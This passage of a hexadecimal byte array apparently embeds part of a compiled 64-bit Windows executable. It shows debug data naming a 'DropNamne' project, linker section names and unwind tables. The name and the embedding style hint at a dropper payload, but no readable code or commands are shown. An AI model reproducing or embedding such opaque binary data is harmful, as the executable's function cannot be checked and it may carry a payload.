0x00,	0x50, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x68, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,	0x30, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,	0xD8, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x90, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0x78, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x58, 0x80, 0x00, 0x00, 0xF8, 0x5B, 0x00, 0x00, 0x00, 0x5D, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xD0, 0x80, 0x00, 0x00, 0x10, 0x5C, 0x00, 0x00,	0x28, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x80, 0x00, 0x00,	0x28, 0x5C, 0x00, 0x00, 0x50, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x80, 0x80, 0x00, 0x00, 0x40, 0x5C, 0x00, 0x00, 0x78, 0x5D, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xA8, 0x00, 0x00, 0x00,	0x04, 0x00, 0x00, 0x00, 0xE0, 0x81, 0x00, 0x00, 0xB8, 0x5C, 0x00, 0x00,	0xA0, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x82, 0x00, 0x00,	0xE8, 0x5C, 0x00, 0x00, 0xC8, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53,	0xAE, 0xD2, 0x68, 0xC8, 0x19, 0xFB, 0x9A, 0x4B, 0xA9, 0xA1, 0xE8, 0xE9,	0xB4, 0x22, 0xB0, 0x28, 0x03, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x55,	0x73, 0x65, 0x72, 0x73, 0x5C, 0x49, 0x45, 0x55, 0x73, 0x65, 0x72, 0x5C,	0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x5C, 0x72, 0x65, 0x70, 0x6F, 0x73,	0x5C, 0x44, 0x72, 0x6F, 0x70, 0x4E, 0x61, 0x6D, 0x6E, 0x65, 0x5C, 0x78,	0x36, 0x34, 0x5C, 0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5C, 0x44,	0x72, 0x6F, 0x70, 0x4E, 0x61, 0x6D, 0x6E, 0x65, 0x2E, 0x70, 0x64, 0x62,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1B, 0x00, 0x00, 0x00,	0x1B, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00,	0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x64, 0x69, 0x00, 0x00, 0x00, 0x00,	0x10, 0x10, 0x00, 0x00, 0xA0, 0x3B, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,	0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x4B, 0x00, 0x00,	0x40, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E,	0x24, 0x30, 0x30, 0x00, 0xF0, 0x4B, 0x00, 0x00, 0xB8, 0x02, 0x00, 0x00,	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x78, 0x00, 0xA8, 0x4E, 0x00, 0x00,	0x5B, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x79, 0x64,	0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x40, 0x03, 0x00, 0x00,	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x00, 0x00, 0x00, 0x00,	0x40, 0x53, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x2E, 0x30, 0x30, 0x63,	0x66, 0x67, 0x00, 0x00, 0x68, 0x53, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,	0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x00, 0x00, 0x00, 0x00,	0x70, 0x53, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,	0x24, 0x58, 0x43, 0x4C, 0x00, 0x00, 0x00, 0x00, 0x78, 0x53, 0x00, 0x00,	0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x5A,	0x00, 0x00, 0x00, 0x00, 0x80, 0x53, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,	0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x00, 0x00, 0x00, 0x00,	0x88, 0x53, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,	0x24, 0x58, 0x49, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x90, 0x53, 0x00, 0x00,	0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x41,	0x00, 0x00, 0x00, 0x00, 0x98, 0x53, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,	0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x5A, 0x00, 0x00, 0x00, 0x00,	0xA0, 0x53, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,	0x24, 0x58, 0x54, 0x41, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x53, 0x00, 0x00,	0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x5A,	0x00, 0x00, 0x00, 0x00, 0xB0, 0x53, 0x00, 0x00, 0x50, 0x04, 0x00, 0x00,	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00,	0xEC, 0x05, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x72,	0x00, 0x00, 0x00, 0x00, 0xEC, 0x5D, 0x00, 0x00, 0x2C, 0x03, 0x00, 0x00,	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62,	0x67, 0x00, 0x00, 0x00, 0x18, 0x61, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,	0x2E, 0x72, 0x74, 0x63, 0x24, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00,	0x20, 0x61, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63,	0x24, 0x49, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x28, 0x61, 0x00, 0x00,	0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x41, 0x41,	0x00, 0x00, 0x00, 0x00, 0x30, 0x61, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,	0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00,	0x38, 0x61, 0x00, 0x00, 0x98, 0x07, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61,	0x74, 0x61, 0x00, 0x00, 0xD0, 0x68, 0x00, 0x00, 0x4C, 0x01, 0x00, 0x00,	0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x24, 0x78, 0x00, 0x00, 0x00, 0x00,	0x1C, 0x6A, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,	0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x6A, 0x00, 0x00,	0x14, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33,	0x00, 0x00, 0x00, 0x00, 0xF8, 0x6A, 0x00, 0x00, 0x40, 0x03, 0x00, 0x00,	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00,	0x38, 0x6E, 0x00, 0x00, 0xDE, 0x0C, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,	0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00,	0x38, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,	0x38, 0x80, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74,	0x61, 0x24, 0x72, 0x00, 0x00, 0x81, 0x00, 0x00, 0xD0, 0x01, 0x00, 0x00,	0x2E, 0x64, 0x61, 0x74, 0x61, 0x24, 0x72, 0x73, 0x00, 0x00, 0x00, 0x00,	0xD0, 0x82, 0x00, 0x00, 0x50, 0x07, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73,	0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x7C, 0x05, 0x00, 0x00,	0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00,	0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x31,	0x00, 0x00, 0x00, 0x00, 0x60, 0xA0, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00,	0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x01, 0x1B, 0x04, 0x00, 0x1B, 0x52, 0x17, 0x70, 0x16, 0x60, 0x15, 0x30,	0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x0A, 0x04, 0x00,	0x0A, 0x34, 0x06, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x01, 0x04, 0x01, 0x00,	0x04, 0x82, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00,	0x19, 0x35, 0x0B, 0x00, 0x24, 0xE4, 0x1B, 0x01, 0x24, 0x74, 0x1A, 0x01,	0x24, 0x64, 0x19, 0x01, 0x24, 0x34, 0x18, 0x01, 0x24, 0x01, 0x16, 0x01,	0x15, 0x50, 0x00, 0x00, 0x1C, 0x4B, 0x00, 0x00, 0x90, 0x61, 0x00, 0x00,	0xA2, 0x08, 0x00, 0x00, 0x28, 0x99, 0x61, 0x00, 0x00, 0xF3, 0x61, 0x00,	0x00, 0x1C, 0x0E, 0xF0, 0x4B, 0x00, 0x00, 0x2E, 0x27, 0x4C, 0x00, 0x00,	0x2C, 0x40, 0x3C, 0x00, 0x00, 0x01, 0x02, 0x92, 0xC0, 0x1E, 0x00, 0x00,	0x41, 0x04, 0x3A, 0x10, 0x2D, 0x00, 0x00, 0xA1, 0x02, 0x3A, 0x10, 0x2D,	0x00, 0x00, 0xA1, 0x03, 0x3A, 0x10, 0x2D, 0x00, 0x00, 0x21, 0x03, 0x3A,	0x10, 0x2D, 0x00, 0x00, 0xC0, 0x32, 0x10, 0x2D, 0x00, 0x00, 0x80, 0x9E,	0x8F, 0x4C, 0x00, 0x00, 0x2A, 0x10, 0x2D, 0x00, 0x00, 0x80, 0x32, 0x10,	0x2D, 0x00, 0x00, 0x81, 0x08, 0xC2, 0x10, 0x2D, 0x00, 0x00, 0x01, 0x02,	0xFA, 0x10, 0x2D, 0x00, 0x00, 0x81, 0x08, 0x32, 0xCE, 0x00, 0x38, 0x02,	0x72, 0x04, 0x48, 0x06, 0xA2, 0x0A, 0x4A, 0x0C, 0xE8, 0x0E, 0x3A, 0x10,	0x8C, 0x12, 0x49, 0x04, 0x0E, 0x1D, 0x02, 0x14, 0x2D, 0x02, 0x16, 0xA0,	0x18, 0x50, 0x16, 0x35, 0x05, 0x0E, 0x30, 0x10, 0x82, 0x12, 0x82, 0x1A,	0xA5, 0x08, 0x0E, 0x30, 0x10, 0x82, 0x12, 0xB2, 0x1C, 0xE9, 0x03, 0x0E,	0x60, 0x0C, 0x7D, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00,	0x06, 0x32, 0x02, 0x50, 0x19, 0x0A, 0x04, 0x00, 0x0A, 0x34, 0x06, 0x00,	0x0A, 0x32, 0x06, 0x70, 0x20, 0x4A, 0x00, 0x00, 0x4C, 0x62, 0x00, 0x00,	0x68, 0x55, 0x62, 0x00, 0x00, 0x5B, 0x62, 0x00, 0x00, 0x02, 0x0E, 0x26,	0x4A, 0x00, 0x00, 0x02, 0x59, 0x02, 0x02, 0x00, 0x19, 0x16, 0x03, 0x00,	0x07, 0x82, 0x03, 0x60, 0x02, 0x30, 0x00, 0x00, 0xA0, 0x4A, 0x00, 0x00,	0x38, 0x00, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x08, 0x00,	0x50, 0x20, 0x00, 0x00, 0x9D, 0x20, 0x00, 0x00, 0x60, 0x62, 0x00, 0x00,	0x21, 0x00, 0x00, 0x00, 0x50, 0x20, 0x00, 0x00, 0x9D, 0x20, 0x00, 0x00,	0x60, 0x62, 0x00, 0x00, 0x19, 0x17, 0x04, 0x00, 0x08, 0x52, 0x04, 0x70,	0x03, 0x60, 0x02, 0x30, 0xA0, 0x4A, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,	0x19, 0x1A, 0x06, 0x00, 0x0B, 0x52, 0x07, 0xE0, 0x05, 0x70, 0x04, 0x60,	0x03, 0x50, 0x02, 0x30, 0xA0, 0x4A, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,	0x01, 0x45, 0x0A, 0x00, 0x45, 0x64, 0x07, 0x00, 0x40, 0x54, 0x06, 0x00,	0x10, 0x74, 0x09, 0x00, 0x10, 0x34, 0x08, 0x00, 0x10, 0x32, 0x0C, 0xE0,	0x01, 0x09, 0x04, 0x00, 0x09, 0x52, 0x05, 0xE0, 0x03, 0x60, 0x02, 0x50,	0x21, 0x1F, 0x04, 0x00, 0x1F, 0x74, 0x04, 0x00, 0x05, 0x34, 0x05, 0x00,	0x20, 0x24, 0x00, 0x00, 0x5C, 0x24, 0x00, 0x00, 0xDC, 0x62, 0x00, 0x00,	0x21, 0x00, 0x04, 0x00, 0x00, 0x74, 0x04, 0x00, 0x00, 0x34, 0x05, 0x00,	0x20, 0x24, 0x00, 0x00, 0x5C, 0x24, 0x00, 0x00, 0xDC, 0x62, 0x00, 0x00,	0x19, 0x23, 0x06, 0x00, 0x15, 0x74, 0x14, 0x00, 0x15, 0x34, 0x13, 0x00,	0x15, 0xF2, 0x0B, 0x50, 0x1C, 0x4B, 0x00, 0x00, 0x34, 0x63, 0x00, 0x00,	0x7A, 0x00, 0x00, 0x00, 0x28, 0x3D, 0x63, 0x00, 0x00, 0x44, 0x63, 0x00,	0x00, 0x02, 0x0A, 0x10, 0x2D, 0x00, 0x00, 0xB0, 0x04, 0x95, 0x04, 0x02,	0x3D, 0x03, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x06, 0x00,	0x50, 0x28, 0x00, 0x00, 0x83, 0x28, 0x00, 0x00, 0x44, 0x61, 0x00, 0x00,	0x21, 0x00, 0x02, 0x00, 0x00, 0x74, 0x06, 0x00, 0x50, 0x28, 0x00, 0x00,	0x83, 0x28, 0x00, 0x00, 0x44, 0x61, 0x00, 0x00, 0x01, 0x0A, 0x04, 0x00,	0x0A, 0x34, 0x08, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x19, 0x1C, 0x04, 0x00,	0x0D, 0x34, 0x15, 0x00, 0x0D, 0xF2, 0x06, 0x70, 0xA0, 0x4A, 0x00, 0x00,	0x78, 0x00, 0x00, 0x00, 0x21, 0x08, 0x02, 0x00, 0x08, 0x64, 0x14, 0x00,	0xA0, 0x29, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x00, 0x80, 0x63, 0x00, 0x00,	0x21, 0x00, 0x00, 0x00, 0xA0, 0x29, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x00,	0x80, 0x63, 0x00, 0x00, 0x19, 0x1B, 0x06, 0x00, 0x0C, 0x34, 0x10, 0x00,	0x0C, 0x92, 0x08, 0x70, 0x07, 0x60, 0x06, 0x50, 0x1C, 0x4B, 0x00, 0x00,	0xD4, 0x63, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x28, 0xDD, 0x63, 0x00,	0x00, 0xE4, 0x63, 0x00, 0x00, 0x02, 0x0A, 0xD0, 0x12, 0x00, 0x00, 0x40,	0x06, 0x9A, 0x00, 0x21, 0x03, 0x02, 0x58, 0x00, 0x19, 0x0A, 0x04, 0x00,	0x0A, 0x34, 0x06, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x20, 0x4A, 0x00, 0x00,	0x00, 0x64, 0x00, 0x00, 0x68, 0x55, 0x62, 0x00, 0x00, 0x09, 0x64, 0x00,	0x00, 0x02, 0xB2, 0x02, 0x19, 0x15, 0x02, 0x00, 0x06, 0xB2, 0x02, 0x30,	0xA0, 0x4A, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00,	0x05, 0x74, 0x0F, 0x00, 0x40, 0x2E, 0x00, 0x00, 0x75, 0x2E, 0x00, 0x00,	0x0C, 0x64, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0x74, 0x0F, 0x00,	0x40, 0x2E, 0x00, 0x00, 0x75, 0x2E, 0x00, 0x00, 0x0C, 0x64, 0x00, 0x00,	0x21, 0x00, 0x00, 0x00, 0x40, 0x2E, 0x00, 0x00, 0x75, 0x2E, 0x00, 0x00,	0x0C, 0x64, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x08, 0x00,	0x0F, 0x34, 0x07, 0x00, 0x0F, 0x32, 0x0B, 0x70, 0x01, 0x0C, 0x06, 0x00,	0x0C, 0x32, 0x08, 0xF0, 0x06, 0xE0, 0x04, 0x70, 0x03, 0x50, 0x02, 0x30,	0x21, 0x05, 0x02, 0x00, 0x05, 0x64, 0x0D, 0x00, 0xB0, 0x2F, 0x00, 0x00,	0x3B, 0x30, 0x00, 0x00, 0x64, 0x64, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00,	0x00, 0x64, 0x0D, 0x00, 0xB0, 0x2F, 0x00, 0x00, 0x3B, 0x30, 0x00, 0x00,	0x64, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xB0, 0x2F, 0x00, 0x00,	0x3B, 0x30, 0x00, 0x00, 0x64, 0x64, 0x00, 0x00, 0x01, 0x0A, 0x04, 0x00,	0x0A, 0x64, 0x09, 0x00, 0x0A, 0x52, 0x06, 0x70, 0x21, 0x05, 0x02, 0x00,	0x05, 0x34, 0x08, 0x00, 0x10, 0x31, 0x00, 0x00, 0x33, 0x31, 0x00, 0x00,	0xAC, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x10, 0x31, 0x00, 0x00,	0x33, 0x31, 0x00, 0x00, 0xAC, 0x64, 0x00, 0x00, 0x19, 0x17, 0x06, 0x00,	0x17, 0x34, 0x0C, 0x00, 0x17, 0x52, 0x13, 0xE0, 0x11, 0x70, 0x10, 0x60,	0x20, 0x4A, 0x00, 0x00, 0xF4, 0x64, 0x00, 0x00, 0x38, 0x01, 0x65, 0x00,	0x00, 0x1A, 0x65, 0x00, 0x00, 0x2B, 0x65, 0x00, 0x00, 0x0C, 0x0A, 0xA0,	0x37, 0x00, 0x00, 0x40, 0x3A, 0x40, 0x37, 0x00, 0x00, 0x40, 0x30, 0x38,	0x7E, 0x26, 0x4A, 0x00, 0x00, 0x2E, 0x26, 0x4A, 0x00, 0x00, 0x02, 0x04,	0x04, 0x06, 0x22, 0x65, 0x00, 0x00, 0x02, 0x11, 0x80, 0x58, 0x4D, 0x00,	0x00, 0x45, 0x05, 0x0E, 0xAA, 0x00, 0x54, 0x02, 0xAE, 0x06, 0xF2, 0x04,	0x4C, 0x0A, 0x28, 0x0C, 0x30, 0x00, 0x00, 0x00, 0x01, 0x0A, 0x02, 0x00,	0x0A, 0x32, 0x06, 0x50, 0x19, 0x1E, 0x06, 0x00, 0x0F, 0x64, 0x0C, 0x00,	0x0F, 0x34, 0x0B, 0x00, 0x0F, 0x72, 0x0B, 0x70, 0x1C, 0x4B, 0x00, 0x00,	0x60, 0x65, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x00, 0x28, 0x69, 0x65, 0x00,	0x00, 0x76, 0x65, 0x00, 0x00, 0x04, 0x0A, 0x00, 0x3C, 0x00, 0x00, 0x50,	0x32, 0x80, 0x37, 0x00, 0x00, 0x60, 0x08, 0x84, 0x02, 0xD6, 0x04, 0x3A,	0x00, 0x56, 0x02, 0x00, 0x01, 0x0A, 0x05, 0x00, 0x0A, 0x42, 0x06, 0xF0,	0x04, 0x60, 0x03, 0x50, 0x02, 0x30, 0x00, 0x00, 0x21, 0x45, 0x06, 0x00,	0x45, 0x74, 0x0B, 0x00, 0x0E, 0xE4, 0x04, 0x00, 0x05, 0xC4, 0x0C, 0x00,	0x50, 0x34, 0x00, 0x00, 0x7F, 0x34, 0x00, 0x00, 0x80, 0x65, 0x00, 0x00,	0x21, 0x00, 0x06, 0x00, 0x00, 0xE4, 0x04, 0x00, 0x00, 0xC4, 0x0C, 0x00,	0x00, 0x74, 0x0B, 0x00, 0x50, 0x34, 0x00, 0x00, 0x7F, 0x34, 0x00, 0x00,	0x80, 0x65, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x50, 0x34, 0x00, 0x00,	0x7F, 0x34, 0x00, 0x00, 0x80, 0x65, 0x00, 0x00, 0x01, 0x0B, 0x05, 0x00,	0x0B, 0x62, 0x07, 0xD0, 0x05, 0xC0, 0x03, 0x60, 0x02, 0x30, 0x00, 0x00,	0x21, 0x4E, 0x08, 0x00, 0x4E, 0xF4, 0x04, 0x00, 0x45, 0x74, 0x06, 0x00,	0x0E, 0xE4, 0x05, 0x00, 0x05, 0x54, 0x0E, 0x00, 0xB0, 0x35, 0x00, 0x00,	0xDE, 0x35, 0x00, 0x00, 0xD8, 0x65, 0x00, 0x00, 0x21, 0x00, 0x08, 0x00,	0x00, 0xF4, 0x04, 0x00, 0x00, 0xE4, 0x05, 0x00, 0x00, 0x74, 0x06, 0x00,	0x00, 0x54, 0x0E, 0x00, 0xB0, 0x35, 0x00, 0x00, 0xDE, 0x35, 0x00, 0x00,	0xD8, 0x65, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xB0, 0x35, 0x00, 0x00,	0xDE, 0x35, 0x00, 0x00, 0xD8, 0x65, 0x00, 0x00, 0x19, 0x06, 0x02, 0x00,	0x06, 0x32, 0x02, 0x30, 0x20, 0x4A, 0x00, 0x00, 0x48, 0x66, 0x00, 0x00,	0x68, 0x55, 0x62, 0x00, 0x00, 0x51, 0x66, 0x00, 0x00, 0x04, 0x2C, 0x00,	0x3C, 0x02, 0x00, 0x00, 0x19, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00,	0x20, 0x4A, 0x00, 0x00, 0x68, 0x66, 0x00, 0x00, 0x60, 0x6D, 0x66, 0x00,	0x00, 0x02, 0x36, 0x00, 0x01, 0x10, 0x06, 0x00, 0x10, 0xE4, 0x0B, 0x00,	0x10, 0x74, 0x0A, 0x00, 0x10, 0x52, 0x0C, 0xF0, 0x21, 0x15, 0x04, 0x00,	0x15, 0x64, 0x09, 0x00, 0x05, 0x34, 0x08, 0x00, 0xD0, 0x37, 0x00, 0x00,	0x00, 0x38, 0x00, 0x00, 0x70, 0x66, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,	0xD0, 0x37, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x70, 0x66, 0x00, 0x00,	0x19, 0x16, 0x08, 0x00, 0x16, 0x34, 0x0D, 0x00, 0x16, 0x52, 0x12, 0xF0,	0x10, 0xE0, 0x0E, 0xC0, 0x0C, 0x70, 0x0B, 0x60, 0x20, 0x4A, 0x00, 0x00,	0xC4, 0x66, 0x00, 0x00, 0x38, 0x01, 0x65, 0x00, 0x00, 0xD1, 0x66, 0x00,	0x00, 0xE2, 0x66, 0x00, 0x00, 0x02, 0x04, 0x04, 0x06, 0xD9, 0x66, 0x00,	0x00, 0x02, 0x11, 0x80, 0xD8, 0x4D, 0x00, 0x00, 0x69, 0x05, 0x10, 0xBA,	0x00, 0x54, 0x02, 0xAE, 0x06, 0x98, 0x04, 0x32, 0x06, 0x68, 0x04, 0x28,	0x0A, 0x36, 0x0C, 0x00, 0x01, 0x0B, 0x05, 0x00, 0x0B, 0x42, 0x07, 0xE0,	0x05, 0xC0, 0x03, 0x60, 0x02, 0x30, 0x00, 0x00, 0x21, 0x45, 0x06, 0x00,	0x45, 0x74, 0x0D, 0x00, 0x0E, 0xF4, 0x04, 0x00, 0x05, 0x54, 0x0C, 0x00,	0x80, 0x3A, 0x00, 0x00, 0xB0, 0x3A, 0x00, 0x00, 0xF4, 0x66, 0x00, 0x00,	0x21, 0x00, 0x06, 0x00, 0x00, 0xF4, 0x04, 0x00, 0x00, 0x74, 0x0D, 0x00,	0x00, 0x54, 0x0C, 0x00, 0x80, 0x3A, 0x00, 0x00, 0xB0, 0x3A, 0x00, 0x00,	0xF4, 0x66, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x80, 0x3A, 0x00, 0x00,	0xB0, 0x3A, 0x00, 0x00, 0xF4, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0x11, 0x15, 0x08, 0x00, 0x15, 0x74, 0x09, 0x00,	0x15, 0x64, 0x07, 0x00, 0x15, 0x34, 0x06, 0x00, 0x15, 0x32, 0x11, 0xE0,	0x2C, 0x4A, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x7C, 0x3D, 0x00, 0x00,	0xEB, 0x3D, 0x00, 0x00, 0x13, 0x4E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x4E, 0x3E, 0x00, 0x00, 0x59, 0x3E, 0x00, 0x00, 0x13, 0x4E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x11, 0x0A, 0x04, 0x00, 0x0A, 0x34, 0x08, 0x00,	0x0A, 0x52, 0x06, 0x70, 0x2C, 0x4A, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,	0x93, 0x3E, 0x00, 0x00, 0xB2, 0x3E, 0x00, 0x00, 0x2A, 0x4E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x88, 0x3E, 0x00, 0x00, 0xCA, 0x3E, 0x00, 0x00,	0x43, 0x4E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD3, 0x3E, 0x00, 0x00,	0xDE, 0x3E, 0x00, 0x00, 0x2A, 0x4E, 0x00, 0x00, 0x00, 0x00, 